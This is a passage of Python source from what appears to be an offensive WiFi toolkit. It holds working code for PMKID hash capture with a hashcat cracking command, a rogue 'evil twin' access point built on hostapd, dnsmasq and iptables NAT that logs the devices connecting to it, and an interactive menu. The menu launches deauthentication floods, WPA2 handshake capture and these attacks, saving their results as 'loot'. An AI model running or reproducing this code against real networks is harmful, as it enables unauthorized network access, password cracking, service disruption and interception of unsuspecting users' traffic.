        pmkid = self._extract_pmkid(pkt)
        if pmkid and pmkid not in [p["pmkid"] for p in self._pmkids]:
            sta_mac = pkt[Dot11].addr1 or ""
            console.print(
                f"\n  [{C_BLOOD}]⚡ PMKID CAPTURED[/{C_BLOOD}]\n"
                f"  [{C_STEEL}]BSSID:[/{C_STEEL}]  [{C_WHITE}]{self.bssid}[/{C_WHITE}]\n"
                f"  [{C_STEEL}]STA:  [/{C_STEEL}]  [{C_ASH}]{sta_mac}[/{C_ASH}]\n"
                f"  [{C_STEEL}]PMKID:[/{C_STEEL}]  [{C_EMBER}]{pmkid}[/{C_EMBER}]"
            )
            self._pmkids.append({
                "bssid": self.bssid,
                "sta":   sta_mac,
                "pmkid": pmkid
            })
            # Save in hashcat format: pmkid*bssid*sta*ssid
            self._save_pmkid(pmkid, sta_mac)
            stop_flag.set()

    def _save_pmkid(self, pmkid, sta_mac):
        """Save PMKID in hashcat 22000 format."""
        os.makedirs(loot_dir, exist_ok=True)
        path = os.path.join(loot_dir, "pmkid_hashes.txt")
        # Format: PMKID*BSSID_no_colon*STA_no_colon*SSID_hex
        bssid_raw = self.bssid.replace(":", "")
        sta_raw   = sta_mac.replace(":", "") if sta_mac else "000000000000"
        line      = f"{pmkid}*{bssid_raw}*{sta_raw}*"
        with open(path, "a") as f:
            f.write(line + "\n")
        ok(f"PMKID saved → {path}")
        info("Crack: hashcat -m 22000 ktox_loot/pmkid_hashes.txt wordlist.txt")
        _loot("PMKID_CAPTURED", {
            "bssid": self.bssid, "sta": sta_mac, "pmkid": pmkid
        })

    def _send_association(self):
        """Send association request to trigger EAPOL from AP."""
        info("Sending association request to trigger EAPOL...")
        # Craft a probe then associate to get the AP to send EAPOL msg 1
        frame = (
            RadioTap() /
            Dot11(type=0, subtype=0,
                  addr1=self.bssid,
                  addr2="aa:bb:cc:dd:ee:ff",
                  addr3=self.bssid) /
            Dot11Auth(algo=0, seqnum=1, status=0)
        )
        sendp(frame, iface=self.iface, verbose=False, count=3)

    def attack(self, timeout=30):
        """Capture PMKID from AP."""
        section("PMKID CLIENTLESS ATTACK")
        console.print(Panel(
            f"  {tag('Target:', C_BLOOD)}   [{C_WHITE}]{self.bssid}[/{C_WHITE}]\n"
            f"  {tag('Channel:', C_STEEL)}  [{C_ASH}]{self.channel}[/{C_ASH}]\n\n"
            f"  [{C_ASH}]Sends association request to AP.\n"
            f"  AP responds with EAPOL msg 1 containing PMKID.\n"
            f"  No connected client required.[/{C_ASH}]",
            border_style=C_RUST,
            title=f"[bold {C_BLOOD}]◈ PMKID ATTACK[/bold {C_BLOOD}]",
            padding=(1,2)
        ))

        _run(["iw", self.iface, "set", "channel", str(self.channel)])
        stop_flag.clear()

        # Send assoc request after short delay
        threading.Thread(target=self._send_association, daemon=True).start()

        info(f"Listening for PMKID for {timeout}s...")
        try:
            sniff(
                iface=self.iface,
                prn=self._handle,
                store=False,
                timeout=timeout,
                stop_filter=lambda _: stop_flag.is_set()
            )
        except KeyboardInterrupt:
            stop_flag.set()

        if not self._pmkids:
            warn("No PMKID captured. AP may not be vulnerable or "
                 "hcxdumptool may be more effective.")
            info("Install hcxdumptool: sudo apt install hcxdumptool")
            info("Run: hcxdumptool -i " + self.iface +
                 " --enable_status=1 -o pmkid.pcapng")

        return self._pmkids


# ══════════════════════════════════════════════════════════════════════════════
# ── EVIL TWIN ACCESS POINT ────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

class EvilTwinAP:
    """
    Creates a rogue Access Point cloning a target network.
    Uses hostapd for the AP + dnsmasq for DHCP + optional captive portal.

    Requires:
      sudo apt install hostapd dnsmasq
      Two wireless interfaces (or one + ethernet for internet passthrough)
    """

    HOSTAPD_CONF = """interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""

    DNSMASQ_CONF = """interface={iface}
dhcp-range={dhcp_start},{dhcp_end},255.255.255.0,12h
dhcp-option=3,{gateway}
dhcp-option=6,{gateway}
server=8.8.8.8
log-queries
no-resolv
"""

    def __init__(self, iface, ssid, channel=6, gateway="10.0.0.1",
                 internet_iface=None):
        self.iface          = iface
        self.ssid           = ssid
        self.channel        = channel
        self.gateway        = gateway
        self.internet_iface = internet_iface
        self._hostapd_proc  = None
        self._dnsmasq_proc  = None
        self._conf_dir      = "/tmp/ktox_eviltwin"

    def _write_configs(self):
        os.makedirs(self._conf_dir, exist_ok=True)

        # hostapd config
        hostapd_path = os.path.join(self._conf_dir, "hostapd.conf")
        with open(hostapd_path, "w") as f:
            f.write(self.HOSTAPD_CONF.format(
                iface=self.iface,
                ssid=self.ssid,
                channel=self.channel
            ))

        # dnsmasq config
        gw_parts = self.gateway.split(".")
        dhcp_base = ".".join(gw_parts[:3])
        dnsmasq_path = os.path.join(self._conf_dir, "dnsmasq.conf")
        with open(dnsmasq_path, "w") as f:
            f.write(self.DNSMASQ_CONF.format(
                iface=self.iface,
                dhcp_start=f"{dhcp_base}.10",
                dhcp_end=f"{dhcp_base}.100",
                gateway=self.gateway
            ))

        return hostapd_path, dnsmasq_path

    def _setup_interface(self):
        """Set interface to AP-friendly state."""
        _run(["ip", "link", "set", self.iface, "down"])
        _run(["iw", self.iface, "set", "type", "__ap"])
        _run(["ip", "link", "set", self.iface, "up"])
        _run(["ip", "addr", "add", f"{self.gateway}/24", "dev", self.iface])

    def _setup_nat(self):
        """Enable NAT if internet passthrough configured."""
        if not self.internet_iface: return
        _run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
        _run(["iptables", "-t", "nat", "-A", "POSTROUTING",
               "-o", self.internet_iface, "-j", "MASQUERADE"])
        _run(["iptables", "-A", "FORWARD",
               "-i", self.iface, "-j", "ACCEPT"])
        ok(f"NAT: {self.iface} → {self.internet_iface}")

    def start(self):
        """Launch evil twin AP."""
        section("EVIL TWIN AP")

        tools = _check_tools()
        if not tools["hostapd"]:
            err("hostapd not found. Install: sudo apt install hostapd dnsmasq")
            return False

        console.print(Panel(
            f"  {tag('SSID:',    C_BLOOD)}     [{C_WHITE}]{self.ssid}[/{C_WHITE}]\n"
            f"  {tag('Channel:', C_STEEL)}    [{C_ASH}]{self.channel}[/{C_ASH}]\n"
            f"  {tag('Gateway:', C_STEEL)}    [{C_ASH}]{self.gateway}[/{C_ASH}]\n"
            f"  {tag('Internet:',C_STEEL)}    [{C_ASH}]{self.internet_iface or 'none (isolated)'}[/{C_ASH}]\n\n"
            f"  [{C_DIM}]Clients connecting will be assigned IPs in\n"
            f"  {self.gateway.rsplit('.',1)[0]}.0/24[/{C_DIM}]",
            border_style=C_RUST,
            title=f"[bold {C_BLOOD}]◈ EVIL TWIN AP[/bold {C_BLOOD}]",
            padding=(1,2)
        ))

        hostapd_path, dnsmasq_path = self._write_configs()
        self._setup_interface()
        if self.internet_iface:
            self._setup_nat()

        # Start dnsmasq
        if tools["dnsmasq"]:
            self._dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "--conf-file=" + dnsmasq_path,
                 "--no-daemon", "--log-facility=-"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            ok("dnsmasq started (DHCP server)")

        # Start hostapd
        self._hostapd_proc = subprocess.Popen(
            ["hostapd", hostapd_path],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True
        )
        ok(f"hostapd started — broadcasting '{self.ssid}'")
        info("Watching for client connections...")
        info("Ctrl+C to stop.\n")

        _loot("EVIL_TWIN_START", {
            "ssid": self.ssid, "channel": self.channel,
            "gateway": self.gateway
        })

        # Stream hostapd output
        try:
            for line in self._hostapd_proc.stdout:
                line = line.strip()
                if not line: continue
                if "AP-STA-CONNECTED" in line:
                    mac = line.split()[-1]
                    console.print(
                        f"  [{C_BLOOD}]⚡ CLIENT CONNECTED[/{C_BLOOD}]  "
                        f"[{C_WHITE}]{mac}[/{C_WHITE}]  "
                        f"[{C_DIM}]{datetime.now().strftime('%H:%M:%S')}[/{C_DIM}]"
                    )
                    _loot("EVIL_TWIN_CLIENT", {"mac": mac, "ssid": self.ssid})
                elif "AP-STA-DISCONNECTED" in line:
                    mac = line.split()[-1]
                    console.print(
                        f"  [{C_STEEL}]CLIENT LEFT[/{C_STEEL}]  [{C_ASH}]{mac}[/{C_ASH}]"
                    )
                elif "EAPOL" in line or "WPA" in line:
                    console.print(f"  [{C_YELLOW}]{line}[/{C_YELLOW}]")
                elif "error" in line.lower() or "failed" in line.lower():
                    console.print(f"  [{C_ORANGE}]{line}[/{C_ORANGE}]")

        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

        return True

    def stop(self):
        """Shut down the AP cleanly."""
        if self._hostapd_proc:
            self._hostapd_proc.terminate()
            self._hostapd_proc.wait()
        if self._dnsmasq_proc:
            self._dnsmasq_proc.terminate()
            self._dnsmasq_proc.wait()
        ok("Evil twin AP stopped.")
        _loot("EVIL_TWIN_STOP", {"ssid": self.ssid})


# ══════════════════════════════════════════════════════════════════════════════
# ── WIFI MENU ─────────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

def wifi_menu():
    """Interactive WiFi attack menu."""

    tools  = _check_tools()
    ifaces = _get_wireless_interfaces()

    # Persistent interface selection — survives across menu iterations
    # Prefer wlan1 (external attack adapter) over wlan0 (built-in)
    def _pick_default(iface_list):
        for candidate in ("wlan1", "wlan2", "wlan3"):
            if candidate in iface_list:
                return candidate
        return iface_list[0] if iface_list else "wlan0"
    selected_iface = _pick_default(ifaces)

    while True:
        section("WiFi ENGINE")

        # Refresh interface list each iteration (USB adapters may appear)
        ifaces = _get_wireless_interfaces()

        # Tool availability
        tool_status = "  ".join(
            f"[{'#1E8449' if v else '#566573'}]{k}[/{'#1E8449' if v else '#566573'}]"
            for k, v in tools.items()
            if k in ("airmon-ng", "airodump-ng", "hostapd", "dnsmasq")
        )
        console.print(f"  [{C_DIM}]Tools:  {tool_status}[/{C_DIM}]")

        # Show all detected interfaces — highlight the selected one
        iface_display = []
        for i in ifaces:
            if i == selected_iface:
                iface_display.append(f"[bold {C_BLOOD}][{i}][/bold {C_BLOOD}]")
            else:
                iface_display.append(f"[{C_DIM}]{i}[/{C_DIM}]")
        console.print(
            f"  [{C_STEEL}]Interfaces: "
            f"{' '.join(iface_display) if iface_display else '[dim]none detected[/dim]'}[/{C_STEEL}]"
            f"  [{C_DIM}](selected: [{C_EMBER}]{selected_iface}[/{C_EMBER}])[/{C_DIM}]\n"
        )

        if not tools["airmon-ng"]:
            console.print(Panel(
                f"  [{C_ORANGE}]aircrack-ng suite not installed.[/{C_ORANGE}]\n\n"
                f"  [{C_DIM}]sudo apt install aircrack-ng hostapd dnsmasq[/{C_DIM}]",
                border_style=C_ORANGE, padding=(1,2),
                title=f"[{C_ORANGE}]⚠ MISSING TOOLS[/{C_ORANGE}]"
            ))

        console.print(f"""
  [{C_BLOOD}][I][/{C_BLOOD}]  [{C_ASH}]Select Interface     Currently: [{C_EMBER}]{selected_iface}[/{C_EMBER}][/{C_ASH}]
  [{C_BLOOD}][1][/{C_BLOOD}]  [{C_ASH}]Enable Monitor Mode[/{C_ASH}]
  [{C_BLOOD}][2][/{C_BLOOD}]  [{C_ASH}]WiFi Scanner         Passive AP + client discovery[/{C_ASH}]
  [{C_BLOOD}][3][/{C_BLOOD}]  [{C_ASH}]Deauth Attack        Force client disconnection[/{C_ASH}]
  [{C_BLOOD}][4][/{C_BLOOD}]  [{C_ASH}]Handshake Capture    WPA2 4-way handshake[/{C_ASH}]
  [{C_BLOOD}][5][/{C_BLOOD}]  [{C_ASH}]PMKID Attack         Clientless WPA2 hash capture[/{C_ASH}]
  [{C_BLOOD}][6][/{C_BLOOD}]  [{C_ASH}]Evil Twin AP         Rogue access point[/{C_ASH}]
  [{C_BLOOD}][7][/{C_BLOOD}]  [{C_ASH}]Disable Monitor Mode Restore managed mode[/{C_ASH}]
  [{C_BLOOD}][E][/{C_BLOOD}]  [{C_ASH}]Back[/{C_ASH}]
""")

        choice = Prompt.ask(f"  [{C_BLOOD}]wifi>[/{C_BLOOD}]").strip().upper()

        if choice == "E":
            return

        # ── [I] Interface selector ────────────────────────────────────────
        if choice == "I":
            ifaces = _get_wireless_interfaces()
            if not ifaces:
                warn("No wireless interfaces detected.")
                try:
                    selected_iface = Prompt.ask(
                        f"  [{C_STEEL}]Enter interface name manually[/{C_STEEL}]",
                        default=selected_iface
                    )
                except KeyboardInterrupt:
                    pass
            else:
                console.print(f"\n  [{C_STEEL}]Available interfaces:[/{C_STEEL}]")
                for i, iface in enumerate(ifaces):
                    driver = ""
                    r = _run(["readlink", f"/sys/class/net/{iface}/device/driver"])
                    if r.returncode == 0:
                        driver = r.stdout.strip().split("/")[-1]
                    mode = MonitorMode(iface)._get_mode(iface)
                    console.print(
                        f"    [{C_BLOOD}][{i}][/{C_BLOOD}]  "
                        f"[{C_WHITE}]{iface:<12}[/{C_WHITE}]  "
                        f"[{C_DIM}]{driver:<12}[/{C_DIM}]  "
                        f"[{C_STEEL}]{mode}[/{C_STEEL}]"
                    )
                console.print()
                try:
                    raw = Prompt.ask(
                        f"  [{C_STEEL}]Select by number or type name "
                        f"[{C_DIM}]default={selected_iface}[/{C_DIM}][/{C_STEEL}]",
                        default=selected_iface
                    )
                    if raw.isdigit() and int(raw) < len(ifaces):
                        selected_iface = ifaces[int(raw)]
                    else:
                        selected_iface = raw.strip()
                    ok(f"Interface set → {selected_iface}")
                except KeyboardInterrupt:
                    pass
            continue

        # All other actions use selected_iface
        iface = selected_iface
        # Get active MonitorMode instance for watchdog (if monitor mode is on)
        active_mon = MonitorMode._active.get(
            next((k for k,v in MonitorMode._active.items()
                  if v.mon_iface == iface), None)
        )

        try:
            if choice == "1":
                mon = MonitorMode(iface)
                mon_iface = mon.enable()
                ok(f"Monitor interface: {mon_iface}")
                selected_iface = mon_iface
                info("Use option [7] to restore managed mode when done.")

            elif choice == "2":
                duration = int(Prompt.ask(
                    f"  [{C_STEEL}]Scan duration seconds[/{C_STEEL}]",
                    default="30"
                ))
                scanner = WiFiScanner(iface, monitor_instance=active_mon)
                scanner.scan(duration)

            elif choice == "3":
                bssid = Prompt.ask(f"  [{C_BLOOD}]Target AP BSSID[/{C_BLOOD}]")
                client = Prompt.ask(
                    f"  [{C_STEEL}]Client MAC [{C_DIM}]Enter for broadcast all[/{C_DIM}][/{C_STEEL}]",
                    default="ff:ff:ff:ff:ff:ff"
                )
                channel = int(Prompt.ask(
                    f"  [{C_STEEL}]Channel[/{C_STEEL}]", default="6"
                ))
                count = int(Prompt.ask(
                    f"  [{C_STEEL}]Packet count [{C_DIM}]0=continuous[/{C_DIM}][/{C_STEEL}]",
                    default="64"
                ))
                deauth = DeauthAttack(iface, bssid, client, channel, count)
                deauth.attack()

            elif choice == "4":
                bssid   = Prompt.ask(f"  [{C_BLOOD}]Target AP BSSID[/{C_BLOOD}]")
                ssid    = Prompt.ask(f"  [{C_STEEL}]SSID (optional)[/{C_STEEL}]", default="")
                channel = int(Prompt.ask(f"  [{C_STEEL}]Channel[/{C_STEEL}]", default="6"))
                timeout = int(Prompt.ask(f"  [{C_STEEL}]Timeout seconds[/{C_STEEL}]", default="60"))
                auto_d  = Confirm.ask(f"  [{C_STEEL}]Auto-deauth to force reconnect?[/{C_STEEL}]", default=True)
                cap = HandshakeCapture(iface, bssid, ssid, channel, auto_deauth=auto_d)
                cap.capture(timeout)

            elif choice == "5":
                bssid   = Prompt.ask(f"  [{C_BLOOD}]Target AP BSSID[/{C_BLOOD}]")
                channel = int(Prompt.ask(f"  [{C_STEEL}]Channel[/{C_STEEL}]", default="6"))
                timeout = int(Prompt.ask(f"  [{C_STEEL}]Timeout seconds[/{C_STEEL}]", default="30"))
                pmkid = PMKIDAttack(iface, bssid, channel)
                pmkid.attack(timeout)

            elif choice == "6":
                ssid    = Prompt.ask(f"  [{C_BLOOD}]SSID to broadcast[/{C_BLOOD}]")
                channel = int(Prompt.ask(f"  [{C_STEEL}]Channel[/{C_STEEL}]", default="6"))
                gateway = Prompt.ask(f"  [{C_STEEL}]Gateway IP[/{C_STEEL}]", default="10.0.0.1")
                inet    = Prompt.ask(
                    f"  [{C_STEEL}]Internet interface [{C_DIM}]blank=none[/{C_DIM}][/{C_STEEL}]",
                    default=""
                )
                ap = EvilTwinAP(iface, ssid, channel, gateway,
                                internet_iface=inet or None)
                ap.start()

            elif choice == "7":
                if MonitorMode._active:
                    # Save originals BEFORE disable_all() clears the registry
                    orig_ifaces = list(MonitorMode._active.keys())
                    MonitorMode.disable_all()
                    # Return to the original managed interface
                    if orig_ifaces:
                        selected_iface = orig_ifaces[0]
                        ok(f"Monitor disabled — interface reset to {selected_iface}")
                    else:
                        ok("Monitor disabled.")
                else:
                    warn(f"No tracked monitor instance. Attempting direct restore of {iface}...")
                    mon = MonitorMode(iface)
                    mon.mon_iface = iface
                    mon.disable()   # use proper disable() — _iw_restore() doesn't exist
                    ok("Attempted restore — verify with: iw dev")

            else:
                console.print(f"  [{C_ORANGE}]Invalid option.[/{C_ORANGE}]")

        except KeyboardInterrupt:
            stop_flag.set()
            console.print(f"\n  [{C_ORANGE}]Interrupted.[/{C_ORANGE}]")
            # Always restore monitor mode on Ctrl+C
            if MonitorMode._active:
                warn("Restoring monitor mode interfaces...")
                MonitorMode.disable_all()
            stop_flag.clear()
        except Exception as ex:
            err(f"Error: {ex}")
            import traceback; traceback.print_exc()


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("ERROR: Must run as root"); sys.exit(1)
    wifi_menu()
